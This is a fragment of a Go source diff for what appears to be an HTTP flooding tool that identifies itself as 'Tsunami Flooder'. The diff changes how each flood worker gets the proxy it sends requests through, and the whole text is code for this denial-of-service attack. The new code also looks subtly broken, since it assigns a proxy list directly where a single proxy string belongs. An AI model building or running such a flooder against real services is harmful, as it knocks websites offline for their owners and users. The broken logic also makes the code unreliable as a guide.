@@ -5,12 +5,6 @@ import (
 	"net/http"
 	"crypto/tls"
 	"net/url"
-	"bufio"
-	"fmt"
-	"log"
-	"math/rand"
-	"os"
-	"time"
 )
 
 type floodWorker struct {
@@ -20,37 +14,11 @@ type floodWorker struct {
 	RequestCounter int
 }
 
-var (
-	proxyList []string
-	random3     *rand.Rand
-	source3     rand.Source
-)
-
-func (fw *floodWorker) Start() {
-
-//Load user agents from file
-			file, err := os.Open(*proxyListFile)
-			if err != nil {
-				//File not found, or whatever, use default UA
-				proxyList = append(proxyList, "Tsunami Flooder (https://github.com/ammar/tsunami)")
-				fmt.Println(err)
-			} else {
-				defer file.Close()
-				scanner := bufio.NewScanner(file)
-				for scanner.Scan() {
-					proxyList = append(proxyList, scanner.Text())
-				}
-				if err := scanner.Err(); err != nil {
-					log.Fatal(err)
-				}
-			}
-			
-			
+func (fw *floodWorker) Start() {	
 	go func() {
 		defer fw.Kill()
 		client := &http.Client{}
 		if scheme == "https" {
-
 		}
 		
 		for {
@@ -58,14 +26,11 @@ func (fw *floodWorker) Start() {
 				return
 			}
 			
+			//Gets proxy
+			proxyList := getProxyList()
 			
-			//Initiate random number generator
-			source3 = rand.NewSource(time.Now().UnixNano())
-			random3 = rand.New(source3)
-			index := int(random.Uint32()) % len(proxyList)
-
-			//creating the proxyURL
-			proxyStr := proxyList[index]
+			//Creating Proxy
+			proxyStr := proxyList
 			proxyURL, err := url.Parse(proxyStr)
 			if err != nil {
 				lastErr = err.Error()
